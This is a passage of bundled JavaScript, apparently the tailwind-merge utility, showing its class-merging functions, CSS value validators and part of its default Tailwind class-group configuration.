      if (!hasPostfixModifier) {
        result = originalClassName + (result.length > 0 ? " " + result : result);
        continue;
      }
      classGroupId = getClassGroupId(baseClassName);
      if (!classGroupId) {
        result = originalClassName + (result.length > 0 ? " " + result : result);
        continue;
      }
      hasPostfixModifier = false;
    }
    const variantModifier = sortModifiers(modifiers).join(":");
    const modifierId = hasImportantModifier ? variantModifier + IMPORTANT_MODIFIER : variantModifier;
    const classId = modifierId + classGroupId;
    if (classGroupsInConflict.includes(classId)) {
      continue;
    }
    classGroupsInConflict.push(classId);
    const conflictGroups = getConflictingClassGroupIds(classGroupId, hasPostfixModifier);
    for (let i = 0; i < conflictGroups.length; ++i) {
      const group = conflictGroups[i];
      classGroupsInConflict.push(modifierId + group);
    }
    result = originalClassName + (result.length > 0 ? " " + result : result);
  }
  return result;
};
function twJoin() {
  let index2 = 0;
  let argument;
  let resolvedValue;
  let string = "";
  while (index2 < arguments.length) {
    if (argument = arguments[index2++]) {
      if (resolvedValue = toValue(argument)) {
        string && (string += " ");
        string += resolvedValue;
      }
    }
  }
  return string;
}
var toValue = (mix) => {
  if (typeof mix === "string") {
    return mix;
  }
  let resolvedValue;
  let string = "";
  for (let k = 0; k < mix.length; k++) {
    if (mix[k]) {
      if (resolvedValue = toValue(mix[k])) {
        string && (string += " ");
        string += resolvedValue;
      }
    }
  }
  return string;
};
function createTailwindMerge(createConfigFirst, ...createConfigRest) {
  let configUtils;
  let cacheGet;
  let cacheSet;
  let functionToCall = initTailwindMerge;
  function initTailwindMerge(classList) {
    const config = createConfigRest.reduce((previousConfig, createConfigCurrent) => createConfigCurrent(previousConfig), createConfigFirst());
    configUtils = createConfigUtils(config);
    cacheGet = configUtils.cache.get;
    cacheSet = configUtils.cache.set;
    functionToCall = tailwindMerge;
    return tailwindMerge(classList);
  }
  function tailwindMerge(classList) {
    const cachedResult = cacheGet(classList);
    if (cachedResult) {
      return cachedResult;
    }
    const result = mergeClassList(classList, configUtils);
    cacheSet(classList, result);
    return result;
  }
  return function callTailwindMerge() {
    return functionToCall(twJoin.apply(null, arguments));
  };
}
var fromTheme = (key) => {
  const themeGetter = (theme) => theme[key] || [];
  themeGetter.isThemeGetter = true;
  return themeGetter;
};
var arbitraryValueRegex = /^\[(?:([a-z-]+):)?(.+)\]$/i;
var fractionRegex = /^\d+\/\d+$/;
var stringLengths = /* @__PURE__ */ new Set(["px", "full", "screen"]);
var tshirtUnitRegex = /^(\d+(\.\d+)?)?(xs|sm|md|lg|xl)$/;
var lengthUnitRegex = /\d+(%|px|r?em|[sdl]?v([hwib]|min|max)|pt|pc|in|cm|mm|cap|ch|ex|r?lh|cq(w|h|i|b|min|max))|\b(calc|min|max|clamp)\(.+\)|^0$/;
var colorFunctionRegex = /^(rgba?|hsla?|hwb|(ok)?(lab|lch))\(.+\)$/;
var shadowRegex = /^(inset_)?-?((\d+)?\.?(\d+)[a-z]+|0)_-?((\d+)?\.?(\d+)[a-z]+|0)/;
var imageRegex = /^(url|image|image-set|cross-fade|element|(repeating-)?(linear|radial|conic)-gradient)\(.+\)$/;
var isLength = (value) => isNumber(value) || stringLengths.has(value) || fractionRegex.test(value);
var isArbitraryLength = (value) => getIsArbitraryValue(value, "length", isLengthOnly);
var isNumber = (value) => Boolean(value) && !Number.isNaN(Number(value));
var isArbitraryNumber = (value) => getIsArbitraryValue(value, "number", isNumber);
var isInteger = (value) => Boolean(value) && Number.isInteger(Number(value));
var isPercent = (value) => value.endsWith("%") && isNumber(value.slice(0, -1));
var isArbitraryValue = (value) => arbitraryValueRegex.test(value);
var isTshirtSize = (value) => tshirtUnitRegex.test(value);
var sizeLabels = /* @__PURE__ */ new Set(["length", "size", "percentage"]);
var isArbitrarySize = (value) => getIsArbitraryValue(value, sizeLabels, isNever);
var isArbitraryPosition = (value) => getIsArbitraryValue(value, "position", isNever);
var imageLabels = /* @__PURE__ */ new Set(["image", "url"]);
var isArbitraryImage = (value) => getIsArbitraryValue(value, imageLabels, isImage);
var isArbitraryShadow = (value) => getIsArbitraryValue(value, "", isShadow);
var isAny = () => true;
var getIsArbitraryValue = (value, label, testValue) => {
  const result = arbitraryValueRegex.exec(value);
  if (result) {
    if (result[1]) {
      return typeof label === "string" ? result[1] === label : label.has(result[1]);
    }
    return testValue(result[2]);
  }
  return false;
};
var isLengthOnly = (value) => (
  // `colorFunctionRegex` check is necessary because color functions can have percentages in them which which would be incorrectly classified as lengths.
  // For example, `hsl(0 0% 0%)` would be classified as a length without this check.
  // I could also use lookbehind assertion in `lengthUnitRegex` but that isn't supported widely enough.
  lengthUnitRegex.test(value) && !colorFunctionRegex.test(value)
);
var isNever = () => false;
var isShadow = (value) => shadowRegex.test(value);
var isImage = (value) => imageRegex.test(value);
var getDefaultConfig = () => {
  const colors = fromTheme("colors");
  const spacing = fromTheme("spacing");
  const blur = fromTheme("blur");
  const brightness = fromTheme("brightness");
  const borderColor = fromTheme("borderColor");
  const borderRadius = fromTheme("borderRadius");
  const borderSpacing = fromTheme("borderSpacing");
  const borderWidth = fromTheme("borderWidth");
  const contrast = fromTheme("contrast");
  const grayscale = fromTheme("grayscale");
  const hueRotate = fromTheme("hueRotate");
  const invert = fromTheme("invert");
  const gap = fromTheme("gap");
  const gradientColorStops = fromTheme("gradientColorStops");
  const gradientColorStopPositions = fromTheme("gradientColorStopPositions");
  const inset = fromTheme("inset");
  const margin = fromTheme("margin");
  const opacity = fromTheme("opacity");
  const padding = fromTheme("padding");
  const saturate = fromTheme("saturate");
  const scale = fromTheme("scale");
  const sepia = fromTheme("sepia");
  const skew = fromTheme("skew");
  const space = fromTheme("space");
  const translate = fromTheme("translate");
  const getOverscroll = () => ["auto", "contain", "none"];
  const getOverflow = () => ["auto", "hidden", "clip", "visible", "scroll"];
  const getSpacingWithAutoAndArbitrary = () => ["auto", isArbitraryValue, spacing];
  const getSpacingWithArbitrary = () => [isArbitraryValue, spacing];
  const getLengthWithEmptyAndArbitrary = () => ["", isLength, isArbitraryLength];
  const getNumberWithAutoAndArbitrary = () => ["auto", isNumber, isArbitraryValue];
  const getPositions = () => ["bottom", "center", "left", "left-bottom", "left-top", "right", "right-bottom", "right-top", "top"];
  const getLineStyles = () => ["solid", "dashed", "dotted", "double", "none"];
  const getBlendModes = () => ["normal", "multiply", "screen", "overlay", "darken", "lighten", "color-dodge", "color-burn", "hard-light", "soft-light", "difference", "exclusion", "hue", "saturation", "color", "luminosity"];
  const getAlign = () => ["start", "end", "center", "between", "around", "evenly", "stretch"];
  const getZeroAndEmpty = () => ["", "0", isArbitraryValue];
  const getBreaks = () => ["auto", "avoid", "all", "avoid-page", "page", "left", "right", "column"];
  const getNumberAndArbitrary = () => [isNumber, isArbitraryValue];
  return {
    cacheSize: 500,
    separator: ":",
    theme: {
      colors: [isAny],
      spacing: [isLength, isArbitraryLength],
      blur: ["none", "", isTshirtSize, isArbitraryValue],
      brightness: getNumberAndArbitrary(),
      borderColor: [colors],
      borderRadius: ["none", "", "full", isTshirtSize, isArbitraryValue],
      borderSpacing: getSpacingWithArbitrary(),
      borderWidth: getLengthWithEmptyAndArbitrary(),
      contrast: getNumberAndArbitrary(),
      grayscale: getZeroAndEmpty(),
      hueRotate: getNumberAndArbitrary(),
      invert: getZeroAndEmpty(),
      gap: getSpacingWithArbitrary(),
      gradientColorStops: [colors],
      gradientColorStopPositions: [isPercent, isArbitraryLength],
      inset: getSpacingWithAutoAndArbitrary(),
      margin: getSpacingWithAutoAndArbitrary(),
      opacity: getNumberAndArbitrary(),
      padding: getSpacingWithArbitrary(),
      saturate: getNumberAndArbitrary(),
      scale: getNumberAndArbitrary(),
      sepia: getZeroAndEmpty(),
      skew: getNumberAndArbitrary(),
      space: getSpacingWithArbitrary(),
      translate: getSpacingWithArbitrary()
    },
    classGroups: {
      // Layout
      /**
       * Aspect Ratio
       * @see https://tailwindcss.com/docs/aspect-ratio
       */
      aspect: [{
        aspect: ["auto", "square", "video", isArbitraryValue]
      }],
      /**
       * Container
       * @see https://tailwindcss.com/docs/container
       */
      container: ["container"],
      /**
       * Columns
       * @see https://tailwindcss.com/docs/columns
       */
      columns: [{
        columns: [isTshirtSize]
      }],
      /**
       * Break After
       * @see https://tailwindcss.com/docs/break-after
       */
      "break-after": [{
        "break-after": getBreaks()
      }],
      /**
       * Break Before
       * @see https://tailwindcss.com/docs/break-before
       */
      "break-before": [{
        "break-before": getBreaks()
      }],
      /**
       * Break Inside
       * @see https://tailwindcss.com/docs/break-inside
       */
      "break-inside": [{
        "break-inside": ["auto", "avoid", "avoid-page", "avoid-column"]
      }],
      /**
       * Box Decoration Break
       * @see https://tailwindcss.com/docs/box-decoration-break
       */
      "box-decoration": [{
        "box-decoration": ["slice", "clone"]
      }],
      /**
       * Box Sizing
       * @see https://tailwindcss.com/docs/box-sizing
       */
      box: [{
        box: ["border", "content"]
      }],
      /**
       * Display
       * @see https://tailwindcss.com/docs/display
       */
      display: ["block", "inline-block", "inline", "flex", "inline-flex", "table", "inline-table", "table-caption", "table-cell", "table-column", "table-column-group", "table-footer-group", "table-header-group", "table-row-group", "table-row", "flow-root", "grid", "inline-grid", "contents", "list-item", "hidden"],
      /**
       * Floats
       * @see https://tailwindcss.com/docs/float
       */
      float: [{
        float: ["right", "left", "none", "start", "end"]
      }],
      /**
       * Clear
       * @see https://tailwindcss.com/docs/clear
       */
      clear: [{
        clear: ["left", "right", "both", "none", "start", "end"]
      }],
      /**
       * Isolation
       * @see https://tailwindcss.com/docs/isolation
       */
      isolation: ["isolate", "isolation-auto"],
      /**
       * Object Fit
       * @see https://tailwindcss.com/docs/object-fit
       */
      "object-fit": [{
        object: ["contain", "cover", "fill", "none", "scale-down"]
      }],
      /**
       * Object Position
       * @see https://tailwindcss.com/docs/object-position
       */
      "object-position": [{
        object: [...getPositions(), isArbitraryValue]
      }],
      /**
       * Overflow
       * @see https://tailwindcss.com/docs/overflow
       */
      overflow: [{
        overflow: getOverflow()
      }],
      /**
       * Overflow X
       * @see https://tailwindcss.com/docs/overflow
       */
      "overflow-x": [{
        "overflow-x": getOverflow()
      }],
      /**
       * Overflow Y
       * @see https://tailwindcss.com/docs/overflow
       */
      "overflow-y": [{
        "overflow-y": getOverflow()
      }],
      /**
       * Overscroll Behavior
       * @see https://tailwindcss.com/docs/overscroll-behavior
       */
      overscroll: [{
        overscroll: getOverscroll()
      }],
      /**
       * Overscroll Behavior X
       * @see https://tailwindcss.com/docs/overscroll-behavior
       */
      "overscroll-x": [{
        "overscroll-x": getOverscroll()
      }],
      /**
       * Overscroll Behavior Y
       * @see https://tailwindcss.com/docs/overscroll-behavior
       */
      "overscroll-y": [{
        "overscroll-y": getOverscroll()
      }],
      /**
       * Position
       * @see https://tailwindcss.com/docs/position
       */
      position: ["static", "fixed", "absolute", "relative", "sticky"],
      /**
       * Top / Right / Bottom / Left
       * @see https://tailwindcss.com/docs/top-right-bottom-left
       */
      inset: [{
        inset: [inset]
      }],
      /**
       * Right / Left
       * @see https://tailwindcss.com/docs/top-right-bottom-left
       */
      "inset-x": [{
        "inset-x": [inset]
      }],
      /**
       * Top / Bottom
       * @see https://tailwindcss.com/docs/top-right-bottom-left
       */
      "inset-y": [{
        "inset-y": [inset]
      }],
      /**
       * Start
       * @see https://tailwindcss.com/docs/top-right-bottom-left
       */
      start: [{
        start: [inset]
      }],
      /**
       * End
       * @see https://tailwindcss.com/docs/top-right-bottom-left
       */
      end: [{
        end: [inset]
      }],
      /**
       * Top
       * @see https://tailwindcss.com/docs/top-right-bottom-left
       */
      top: [{
        top: [inset]
      }],
      /**
       * Right
       * @see https://tailwindcss.com/docs/top-right-bottom-left
       */
      right: [{
        right: [inset]
      }],
      /**
       * Bottom
       * @see https://tailwindcss.com/docs/top-right-bottom-left
       */
      bottom: [{
        bottom: [inset]
      }],
      /**
       * Left
       * @see https://tailwindcss.com/docs/top-right-bottom-left
       */
      left: [{
        left: [inset]
      }],
      /**
       * Visibility
       * @see https://tailwindcss.com/docs/visibility
       */
      visibility: ["visible", "invisible", "collapse"],
      /**
       * Z-Index
       * @see https://tailwindcss.com/docs/z-index
       */
      z: [{
        z: ["auto", isInteger, isArbitraryValue]
      }],
      // Flexbox and Grid
      /**
       * Flex Basis
       * @see https://tailwindcss.com/docs/flex-basis
       */
      basis: [{
        basis: getSpacingWithAutoAndArbitrary()
      }],
      /**
       * Flex Direction
       * @see https://tailwindcss.com/docs/flex-direction
       */
      "flex-direction": [{
        flex: ["row", "row-reverse", "col", "col-reverse"]
      }],
      /**
       * Flex Wrap
       * @see https://tailwindcss.com/docs/flex-wrap
       */
      "flex-wrap": [{
        flex: ["wrap", "wrap-reverse", "nowrap"]
      }],
      /**
       * Flex
       * @see https://tailwindcss.com/docs/flex
       */
      flex: [{
        flex: ["1", "auto", "initial", "none", isArbitraryValue]
      }],
      /**
       * Flex Grow
       * @see https://tailwindcss.com/docs/flex-grow
       */
      grow: [{
        grow: getZeroAndEmpty()
      }],
      /**
       * Flex Shrink
       * @see https://tailwindcss.com/docs/flex-shrink
       */
      shrink: [{
        shrink: getZeroAndEmpty()
      }],
      /**
       * Order
       * @see https://tailwindcss.com/docs/order
       */
      order: [{
        order: ["first", "last", "none", isInteger, isArbitraryValue]
      }],
      /**
       * Grid Template Columns
       * @see https://tailwindcss.com/docs/grid-template-columns
       */
      "grid-cols": [{
        "grid-cols": [isAny]
      }],
      /**
       * Grid Column Start / End
       * @see https://tailwindcss.com/docs/grid-column
       */
      "col-start-end": [{
        col: ["auto", {
          span: ["full", isInteger, isArbitraryValue]
        }, isArbitraryValue]
      }],
      /**
       * Grid Column Start
       * @see https://tailwindcss.com/docs/grid-column
       */
      "col-start": [{
        "col-start": getNumberWithAutoAndArbitrary()
      }],
      /**
       * Grid Column End
       * @see https://tailwindcss.com/docs/grid-column
       */
      "col-end": [{
        "col-end": getNumberWithAutoAndArbitrary()
      }],
      /**
       * Grid Template Rows
       * @see https://tailwindcss.com/docs/grid-template-rows
       */
      "grid-rows": [{
        "grid-rows": [isAny]
      }],
      /**
       * Grid Row Start / End
       * @see https://tailwindcss.com/docs/grid-row
       */
      "row-start-end": [{
        row: ["auto", {
          span: [isInteger, isArbitraryValue]
        }, isArbitraryValue]
      }],
      /**
       * Grid Row Start
       * @see https://tailwindcss.com/docs/grid-row
       */
      "row-start": [{
        "row-start": getNumberWithAutoAndArbitrary()
      }],
      /**
       * Grid Row End
       * @see https://tailwindcss.com/docs/grid-row
       */
      "row-end": [{
        "row-end": getNumberWithAutoAndArbitrary()
      }],
      /**
       * Grid Auto Flow
       * @see https://tailwindcss.com/docs/grid-auto-flow
       */
      "grid-flow": [{
        "grid-flow": ["row", "col", "dense", "row-dense", "col-dense"]
      }],
      /**
       * Grid Auto Columns
       * @see https://tailwindcss.com/docs/grid-auto-columns
       */
      "auto-cols": [{
        "auto-cols": ["auto", "min", "max", "fr", isArbitraryValue]
      }],
      /**
       * Grid Auto Rows
       * @see https://tailwindcss.com/docs/grid-auto-rows
       */
      "auto-rows": [{
        "auto-rows": ["auto", "min", "max", "fr", isArbitraryValue]
      }],
      /**
       * Gap
       * @see https://tailwindcss.com/docs/gap
       */
      gap: [{
        gap: [gap]
      }],
      /**
       * Gap X
       * @see https://tailwindcss.com/docs/gap
       */
      "gap-x": [{
        "gap-x": [gap]
      }],
      /**
       * Gap Y
       * @see https://tailwindcss.com/docs/gap
       */
      "gap-y": [{
        "gap-y": [gap]
      }],
      /**
       * Justify Content
       * @see https://tailwindcss.com/docs/justify-content
       */
      "justify-content": [{
        justify: ["normal", ...getAlign()]
      }],
      /**
       * Justify Items
       * @see https://tailwindcss.com/docs/justify-items
       */
      "justify-items": [{
        "justify-items": ["start", "end", "center", "stretch"]
      }],
      /**
       * Justify Self
       * @see https://tailwindcss.com/docs/justify-self
       */
      "justify-self": [{
        "justify-self": ["auto", "start", "end", "center", "stretch"]
      }],
      /**
       * Align Content
       * @see https://tailwindcss.com/docs/align-content
       */
      "align-content": [{
        content: ["normal", ...getAlign(), "baseline"]
      }],
      /**
       * Align Items
       * @see https://tailwindcss.com/docs/align-items
       */
      "align-items": [{
        items: ["start", "end", "center", "baseline", "stretch"]
      }],
      /**
       * Align Self
       * @see https://tailwindcss.com/docs/align-self
       */
      "align-self": [{
        self: ["auto", "start", "end", "center", "stretch", "baseline"]
      }],
      /**
       * Place Content
       * @see https://tailwindcss.com/docs/place-content
       */
      "place-content": [{
        "place-content": [...getAlign(), "baseline"]
      }],
      /**
       * Place Items
       * @see https://tailwindcss.com/docs/place-items
       */
      "place-items": [{
        "place-items": ["start", "end", "center", "baseline", "stretch"]
      }],
      /**
       * Place Self
       * @see https://tailwindcss.com/docs/place-self
       */
      "place-self": [{
        "place-self": ["auto", "start", "end", "center", "stretch"]
      }],
      // Spacing
      /**
       * Padding
       * @see https://tailwindcss.com/docs/padding
       */
      p: [{
        p: [padding]
      }],
      /**
       * Padding X
       * @see https://tailwindcss.com/docs/padding
       */
      px: [{
        px: [padding]
      }],
      /**
       * Padding Y
       * @see https://tailwindcss.com/docs/padding
       */
      py: [{
        py: [padding]
      }],
      /**
       * Padding Start
       * @see https://tailwindcss.com/docs/padding
       */
      ps: [{
        ps: [padding]
      }],
      /**
       * Padding End
       * @see https://tailwindcss.com/docs/padding
       */
      pe: [{
        pe: [padding]
      }],
      /**
       * Padding Top
       * @see https://tailwindcss.com/docs/padding
       */
      pt: [{
        pt: [padding]
      }],
      /**
       * Padding Right
       * @see https://tailwindcss.com/docs/padding
       */
      pr: [{
        pr: [padding]
      }],
      /**
       * Padding Bottom
       * @see https://tailwindcss.com/docs/padding
       */
      pb: [{
        pb: [padding]
      }],
      /**
       * Padding Left
       * @see https://tailwindcss.com/docs/padding
       */
      pl: [{
        pl: [padding]
      }],
      /**
       * Margin
       * @see https://tailwindcss.com/docs/margin
       */
      m: [{
        m: [margin]
      }],
      /**
       * Margin X
       * @see https://tailwindcss.com/docs/margin
       */
      mx: [{
        mx: [margin]
      }],
      /**
       * Margin Y
       * @see https://tailwindcss.com/docs/margin
       */
      my: [{
        my: [margin]
      }],
      /**
       * Margin Start
       * @see https://tailwindcss.com/docs/margin
       */
      ms: [{
        ms: [margin]
      }],
      /**
       * Margin End
       * @see https://tailwindcss.com/docs/margin
       */
      me: [{
        me: [margin]
      }],
      /**
       * Margin Top
       * @see https://tailwindcss.com/docs/margin
       */
      mt: [{
        mt: [margin]
      }],
      /**
       * Margin Right
       * @see https://tailwindcss.com/docs/margin
       */
      mr: [{
        mr: [margin]
      }],
      /**
       * Margin Bottom
       * @see https://tailwindcss.com/docs/margin
       */
      mb: [{
        mb: [margin]
      }],
      /**
       * Margin Left
       * @see https://tailwindcss.com/docs/margin
       */
      ml: [{
        ml: [margin]
      }],
      /**
       * Space Between X
       * @see https://tailwindcss.com/docs/space
       */
      "space-x": [{
        "space-x": [space]
      }],
      /**
       * Space Between X Reverse
       * @see https://tailwindcss.com/docs/space
       */
      "space-x-reverse": ["space-x-reverse"],
      /**
       * Space Between Y
       * @see https://tailwindcss.com/docs/space
       */
      "space-y": [{
        "space-y": [space]
      }],
      /**
       * Space Between Y Reverse
       * @see https://tailwindcss.com/docs/space
       */
      "space-y-reverse": ["space-y-reverse"],
      // Sizing
      /**
       * Width
       * @see https://tailwindcss.com/docs/width
       */
      w: [{
        w: ["auto", "min", "max", "fit", "svw", "lvw", "dvw", isArbitraryValue, spacing]
      }],
      /**
       * Min-Width
       * @see https://tailwindcss.com/docs/min-width
       */
      "min-w": [{
        "min-w": [isArbitraryValue, spacing, "min", "max", "fit"]
      }],
      /**
       * Max-Width
       * @see https://tailwindcss.com/docs/max-width
       */
      "max-w": [{
        "max-w": [isArbitraryValue, spacing, "none", "full", "min", "max", "fit", "prose", {
          screen: [isTshirtSize]
        }, isTshirtSize]
      }],
      /**
       * Height
       * @see https://tailwindcss.com/docs/height
       */
      h: [{
        h: [isArbitraryValue, spacing, "auto", "min", "max", "fit", "svh", "lvh", "dvh"]
      }],
      /**
       * Min-Height
       * @see https://tailwindcss.com/docs/min-height
       */
      "min-h": [{
        "min-h": [isArbitraryValue, spacing, "min", "max", "fit", "svh", "lvh", "dvh"]
      }],
      /**
       * Max-Height
       * @see https://tailwindcss.com/docs/max-height
       */
      "max-h": [{
        "max-h": [isArbitraryValue, spacing, "min", "max", "fit", "svh", "lvh", "dvh"]
      }],
      /**
       * Size
       * @see https://tailwindcss.com/docs/size
       */
      size: [{
        size: [isArbitraryValue, spacing, "auto", "min", "max", "fit"]
      }],
      // Typography
      /**
       * Font Size
       * @see https://tailwindcss.com/docs/font-size
       */
      "font-size": [{
        text: ["base", isTshirtSize, isArbitraryLength]
      }],
      /**
       * Font Smoothing
       * @see https://tailwindcss.com/docs/font-smoothing
       */
      "font-smoothing": ["antialiased", "subpixel-antialiased"],
      /**
       * Font Style
       * @see https://tailwindcss.com/docs/font-style
       */
      "font-style": ["italic", "not-italic"],
      /**
       * Font Weight
       * @see https://tailwindcss.com/docs/font-weight
       */
      "font-weight": [{
        font: ["thin", "extralight", "light", "normal", "medium", "semibold", "bold", "extrabold", "black", isArbitraryNumber]
      }],
      /**
       * Font Family
       * @see https://tailwindcss.com/docs/font-family
       */
      "font-family": [{
        font: [isAny]
      }],
      /**
       * Font Variant Numeric
       * @see https://tailwindcss.com/docs/font-variant-numeric
       */
      "fvn-normal": ["normal-nums"],
      /**
       * Font Variant Numeric
       * @see https://tailwindcss.com/docs/font-variant-numeric
       */
      "fvn-ordinal": ["ordinal"],
      /**
       * Font Variant Numeric
       * @see https://tailwindcss.com/docs/font-variant-numeric
       */
      "fvn-slashed-zero": ["slashed-zero"],
      /**
       * Font Variant Numeric
       * @see https://tailwindcss.com/docs/font-variant-numeric
       */
      "fvn-figure": ["lining-nums", "oldstyle-nums"],
      /**
       * Font Variant Numeric
       * @see https://tailwindcss.com/docs/font-variant-numeric
       */
      "fvn-spacing": ["proportional-nums", "tabular-nums"],
      /**
       * Font Variant Numeric
       * @see https://tailwindcss.com/docs/font-variant-numeric
       */
      "fvn-fraction": ["diagonal-fractions", "stacked-fractions"],
      /**
       * Letter Spacing
       * @see https://tailwindcss.com/docs/letter-spacing
       */
      tracking: [{
        tracking: ["tighter", "tight", "normal", "wide", "wider", "widest", isArbitraryValue]
      }],
      /**
       * Line Clamp
       * @see https://tailwindcss.com/docs/line-clamp
       */
      "line-clamp": [{
        "line-clamp": ["none", isNumber, isArbitraryNumber]
      }],
      /**
       * Line Height
       * @see https://tailwindcss.com/docs/line-height
       */
      leading: [{
        leading: ["none", "tight", "snug", "normal", "relaxed", "loose", isLength, isArbitraryValue]
      }],
      /**
       * List Style Image
       * @see https://tailwindcss.com/docs/list-style-image
       */
      "list-image": [{
        "list-image": ["none", isArbitraryValue]
      }],
      /**
       * List Style Type
       * @see https://tailwindcss.com/docs/list-style-type
       */
      "list-style-type": [{
        list: ["none", "disc", "decimal", isArbitraryValue]
      }],
      /**
       * List Style Position
       * @see https://tailwindcss.com/docs/list-style-position
       */
      "list-style-position": [{
        list: ["inside", "outside"]
      }],
      /**
       * Placeholder Color
       * @deprecated since Tailwind CSS v3.0.0
       * @see https://tailwindcss.com/docs/placeholder-color
       */
      "placeholder-color": [{
        placeholder: [colors]
      }],
      /**
       * Placeholder Opacity
       * @see https://tailwindcss.com/docs/placeholder-opacity
       */
      "placeholder-opacity": [{
        "placeholder-opacity": [opacity]
      }],
      /**
       * Text Alignment
       * @see https://tailwindcss.com/docs/text-align
       */
      "text-alignment": [{
        text: ["left", "center", "right", "justify", "start", "end"]
      }],
      /**
       * Text Color
       * @see https://tailwindcss.com/docs/text-color
       */
      "text-color": [{
        text: [colors]
      }],
      /**
       * Text Opacity
       * @see https://tailwindcss.com/docs/text-opacity
       */
      "text-opacity": [{
        "text-opacity": [opacity]
      }],
      /**
       * Text Decoration
       * @see https://tailwindcss.com/docs/text-decoration
       */
      "text-decoration": ["underline", "overline", "line-through", "no-underline"],
      /**
       * Text Decoration Style
       * @see https://tailwindcss.com/docs/text-decoration-style
       */
      "text-decoration-style": [{
        decoration: [...getLineStyles(), "wavy"]
      }],
      /**
       * Text Decoration Thickness
       * @see https://tailwindcss.com/docs/text-decoration-thickness
       */
      "text-decoration-thickness": [{
        decoration: ["auto", "from-font", isLength, isArbitraryLength]
      }],
      /**
       * Text Underline Offset
       * @see https://tailwindcss.com/docs/text-underline-offset
       */
      "underline-offset": [{
        "underline-offset": ["auto", isLength, isArbitraryValue]
      }],
      /**
       * Text Decoration Color
       * @see https://tailwindcss.com/docs/text-decoration-color
       */
      "text-decoration-color": [{
        decoration: [colors]
      }],
      /**
       * Text Transform
       * @see https://tailwindcss.com/docs/text-transform
       */
      "text-transform": ["uppercase", "lowercase", "capitalize", "normal-case"],
      /**
       * Text Overflow
       * @see https://tailwindcss.com/docs/text-overflow
       */
      "text-overflow": ["truncate", "text-ellipsis", "text-clip"],
      /**
       * Text Wrap
       * @see https://tailwindcss.com/docs/text-wrap
       */
      "text-wrap": [{
        text: ["wrap", "nowrap", "balance", "pretty"]
      }],
      /**
       * Text Indent
       * @see https://tailwindcss.com/docs/text-indent
       */
      indent: [{
        indent: getSpacingWithArbitrary()
      }],
      /**
       * Vertical Alignment
       * @see https://tailwindcss.com/docs/vertical-align
       */
      "vertical-align": [{
        align: ["baseline", "top", "middle", "bottom", "text-top", "text-bottom", "sub", "super", isArbitraryValue]
      }],
      /**
       * Whitespace
       * @see https://tailwindcss.com/docs/whitespace
       */
      whitespace: [{
        whitespace: ["normal", "nowrap", "pre", "pre-line", "pre-wrap", "break-spaces"]
      }],
      /**
       * Word Break
       * @see https://tailwindcss.com/docs/word-break
       */
      break: [{
        break: ["normal", "words", "all", "keep"]
      }],
      /**
       * Hyphens
       * @see https://tailwindcss.com/docs/hyphens
       */
      hyphens: [{
        hyphens: ["none", "manual", "auto"]
      }],
      /**
       * Content
       * @see https://tailwindcss.com/docs/content
       */
      content: [{
        content: ["none", isArbitraryValue]
      }],
      // Backgrounds
      /**
       * Background Attachment
       * @see https://tailwindcss.com/docs/background-attachment
       */
      "bg-attachment": [{
        bg: ["fixed", "local", "scroll"]
      }],
      /**
       * Background Clip
       * @see https://tailwindcss.com/docs/background-clip
       */
      "bg-clip": [{
        "bg-clip": ["border", "padding", "content", "text"]
      }],
      /**
       * Background Opacity
       * @deprecated since Tailwind CSS v3.0.0
       * @see https://tailwindcss.com/docs/background-opacity
       */
      "bg-opacity": [{
        "bg-opacity": [opacity]
      }],
      /**
       * Background Origin
       * @see https://tailwindcss.com/docs/background-origin
       */
      "bg-origin": [{
        "bg-origin": ["border", "padding", "content"]
      }],
      /**
       * Background Position
       * @see https://tailwindcss.com/docs/background-position
       */
      "bg-position": [{
        bg: [...getPositions(), isArbitraryPosition]
      }],
      /**
       * Background Repeat
       * @see https://tailwindcss.com/docs/background-repeat
       */
      "bg-repeat": [{
        bg: ["no-repeat", {
          repeat: ["", "x", "y", "round", "space"]
        }]
      }],
      /**
       * Background Size
       * @see https://tailwindcss.com/docs/background-size
       */
      "bg-size": [{
        bg: ["auto", "cover", "contain", isArbitrarySize]
      }],
      /**
       * Background Image
       * @see https://tailwindcss.com/docs/background-image
       */
      "bg-image": [{
        bg: ["none", {
          "gradient-to": ["t", "tr", "r", "br", "b", "bl", "l", "tl"]
        }, isArbitraryImage]
      }],
      /**
       * Background Color
       * @see https://tailwindcss.com/docs/background-color
       */
      "bg-color": [{
        bg: [colors]
      }],
      /**
       * Gradient Color Stops From Position
       * @see https://tailwindcss.com/docs/gradient-color-stops
       */
      "gradient-from-pos": [{
        from: [gradientColorStopPositions]
      }],
      /**
       * Gradient Color Stops Via Position
       * @see https://tailwindcss.com/docs/gradient-color-stops
       */
      "gradient-via-pos": [{
        via: [gradientColorStopPositions]
      }],
      /**
       * Gradient Color Stops To Position
       * @see https://tailwindcss.com/docs/gradient-color-stops
       */
      "gradient-to-pos": [{
        to: [gradientColorStopPositions]
      }],
      /**
       * Gradient Color Stops From
       * @see https://tailwindcss.com/docs/gradient-color-stops
       */
      "gradient-from": [{
        from: [gradientColorStops]
      }],
      /**
       * Gradient Color Stops Via
       * @see https://tailwindcss.com/docs/gradient-color-stops
       */
      "gradient-via": [{
        via: [gradientColorStops]
      }],
      /**
       * Gradient Color Stops To
       * @see https://tailwindcss.com/docs/gradient-color-stops
       */
      "gradient-to": [{
        to: [gradientColorStops]
      }],
      // Borders
      /**
       * Border Radius
       * @see https://tailwindcss.com/docs/border-radius
       */
      rounded: [{
        rounded: [borderRadius]
      }],
      /**
       * Border Radius Start
       * @see https://tailwindcss.com/docs/border-radius
       */
      "rounded-s": [{
        "rounded-s": [borderRadius]
      }],
      /**
       * Border Radius End
       * @see https://tailwindcss.com/docs/border-radius
       */
      "rounded-e": [{
        "rounded-e": [borderRadius]
      }],
      /**
       * Border Radius Top
       * @see https://tailwindcss.com/docs/border-radius
       */
      "rounded-t": [{
        "rounded-t": [borderRadius]
      }],
      /**
       * Border Radius Right
       * @see https://tailwindcss.com/docs/border-radius
       */
      "rounded-r": [{
        "rounded-r": [borderRadius]
      }],
      /**
       * Border Radius Bottom
       * @see https://tailwindcss.com/docs/border-radius
       */
      "rounded-b": [{
        "rounded-b": [borderRadius]
      }],
      /**
       * Border Radius Left
       * @see https://tailwindcss.com/docs/border-radius
       */
      "rounded-l": [{
        "rounded-l": [borderRadius]
      }],
      /**
       * Border Radius Start Start
       * @see https://tailwindcss.com/docs/border-radius
       */
      "rounded-ss": [{
        "rounded-ss": [borderRadius]
      }],
      /**
       * Border Radius Start End
       * @see https://tailwindcss.com/docs/border-radius
       */
      "rounded-se": [{
        "rounded-se": [borderRadius]
      }],
      /**
       * Border Radius End End
